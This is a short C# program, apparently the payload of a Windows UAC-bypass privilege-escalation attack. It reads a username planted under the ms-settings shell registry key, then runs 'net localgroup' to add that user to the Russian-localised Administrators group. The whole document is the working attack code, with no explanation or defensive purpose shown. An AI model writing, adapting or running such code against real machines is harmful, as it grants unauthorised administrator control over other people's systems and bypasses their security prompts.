using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CMDelevater
{
    internal class Program
    {
        static void Main(string[] args)
        {
            RegistryKey currentUserKey = Registry.CurrentUser;
            RegistryKey key = currentUserKey.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\usertoelevate");

            string user = key.GetValue("usertoelevate").ToString();

            ProcessStartInfo p = new ProcessStartInfo("cmd.exe");
            p.Arguments = "/k net localgroup Администраторы " + user + " /add ";
            Process.Start(p);
        }

    }
}
